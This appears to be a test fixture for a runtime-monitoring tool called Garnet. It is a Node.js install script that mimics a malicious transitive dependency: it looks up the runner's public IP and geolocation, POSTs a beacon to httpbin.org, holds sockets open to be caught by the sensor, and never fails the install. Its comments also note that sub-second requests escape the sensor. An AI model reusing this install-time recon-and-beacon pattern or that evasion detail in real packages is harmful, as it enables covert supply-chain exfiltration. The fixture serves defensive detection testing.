// BENIGN DEMO FIXTURE — not malware. Simulates the class of behaviour seen in
// real supply-chain incidents: a deep transitive dependency that, at INSTALL
// time, performs host/network reconnaissance and beacons the result out. None
// of this is visible in a PR that merely adds the top-level package. It is here
// to prove that Garnet's runtime record surfaces install-time egress the diff
// cannot.
//
// Shape matters for the record. A fire-and-forget sub-second request can be
// dropped by the sensor's task-driven flow walking before the periodic
// network-flows cadence (9-15s on the runner) ever ticks — see GRN-004: a
// ~181ms one-shot was recorded as nothing, while the same request held open
// ~15s was fully captured. Real exfil waits for the acknowledgement anyway, so
// this beacon POSTs its payload and blocks on the response, and holds every
// socket open past a full cadence interval. That is the captured regime: the
// destinations appear in the runtime tree deterministically instead of by luck.
const https = require('https');

// Hold each socket ESTABLISHED past one full network-flows cadence interval so
// a periodic sweep always sees the live flow. Sized above the 15s default
// cadence to stay in the captured regime regardless of tick phase.
const DWELL_MS = 18000;

// Recon + beacon to off-registry hosts (all real, reachable, harmless):
//   api.ipify.org  -> the runner's public IP        (recon)
//   ip-api.com     -> geolocation of that IP         (recon)
//   httpbin.org    -> exfil/beacon sink (POST + ack)  (beacon)
function hold(options, body) {
  return new Promise((resolve) => {
    const req = https.request(options, (res) => {
      // Do not drain immediately. Keep the socket ESTABLISHED across a full
      // cadence interval, then read the acknowledgement and let it close.
      setTimeout(() => {
        let ack = '';
        res.on('data', (chunk) => { ack += chunk; });
        res.on('end', () => resolve(ack));
        res.resume();
      }, DWELL_MS);
    });
    req.on('error', () => resolve(''));
    req.setTimeout(DWELL_MS + 6000, () => req.destroy());
    if (body) req.write(body);
    req.end();
  });
}

async function main() {
  const payload = Buffer.from(JSON.stringify({ t: Date.now(), src: 'metrics-beacon' }));
  await Promise.all([
    hold({ host: 'api.ipify.org', path: '/', method: 'GET' }),
    hold({ host: 'ip-api.com', path: '/json', method: 'GET' }),
    hold({
      host: 'httpbin.org',
      path: '/post',
      method: 'POST',
      headers: { 'content-type': 'application/json', 'content-length': payload.length },
    }, payload),
  ]);
}

// Never fail the install, regardless of network outcome.
main().catch(() => {}).finally(() => process.exit(0));
